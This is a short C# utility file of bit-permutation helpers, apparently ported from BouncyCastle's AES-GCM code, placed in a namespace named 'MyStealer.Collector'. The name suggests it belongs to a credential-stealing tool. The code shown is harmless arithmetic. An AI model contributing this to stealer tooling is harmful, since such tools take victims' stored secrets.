using System.Diagnostics;
#if NETSTANDARD1_0_OR_GREATER || NETCOREAPP1_0_OR_GREATER
using System.Runtime.CompilerServices;
#endif

namespace MyStealer.Collector.Utils.BcAesGcm
{
    public static class Bits
    {
#if NETSTANDARD1_0_OR_GREATER || NETCOREAPP1_0_OR_GREATER
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
#endif
        public static uint BitPermuteStep(uint x, uint m, int s)
        {
            Debug.Assert((m & m << s) == 0U);
            Debug.Assert(m << s >> s == m);

            var t = (x ^ x >> s) & m;
            return t ^ t << s ^ x;
        }

#if NETSTANDARD1_0_OR_GREATER || NETCOREAPP1_0_OR_GREATER
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
#endif
        public static ulong BitPermuteStep(ulong x, ulong m, int s)
        {
            Debug.Assert((m & m << s) == 0UL);
            Debug.Assert(m << s >> s == m);

            var t = (x ^ x >> s) & m;
            return t ^ t << s ^ x;
        }

#if NETSTANDARD1_0_OR_GREATER || NETCOREAPP1_0_OR_GREATER
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
#endif
        public static uint BitPermuteStepSimple(uint x, uint m, int s)
        {
            Debug.Assert(m << s == ~m);
            Debug.Assert((m & ~m) == 0U);

            return (x & m) << s | x >> s & m;
        }

#if NETSTANDARD1_0_OR_GREATER || NETCOREAPP1_0_OR_GREATER
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
#endif
        public static ulong BitPermuteStepSimple(ulong x, ulong m, int s)
        {
            Debug.Assert(m << s == ~m);
            Debug.Assert((m & ~m) == 0UL);

            return (x & m) << s | x >> s & m;
        }
    }
}
